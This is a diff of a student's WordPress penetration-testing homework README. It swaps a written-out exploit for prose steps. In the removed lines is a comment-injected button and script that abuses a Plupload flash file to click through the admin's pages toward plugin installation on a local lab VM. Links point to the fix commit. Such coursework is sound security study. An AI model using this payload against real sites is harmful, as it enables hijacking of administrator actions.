@@ -32,17 +32,11 @@ Time spent: 17 hours spent in total
 - [ ] GIF Walkthrough: 
  ![Walkthrough exploit 2](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/2nd%20vulnerability.gif)
 - [ ] Steps to recreate: 
-  - Comment on a post as admin
-  - Insert the following malicious code followed by a button and a script
-  
-  `<button onclick="fire()">Click</button>
-   <script>
-    function fire() {
-    open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?                  target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'",2000)');
-    setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
-      }
-    </script>`
-    
+  - Insert a malicious code followed by a button and a script to the comment section of a post
+  - Post the comment as admin
+  - A button will appear as a comment
+  - Click the button
+  - It will ask us to download something
 - [ ] Affected source code:
   - [Link 1](https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8)
   - [Link 2](https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e)
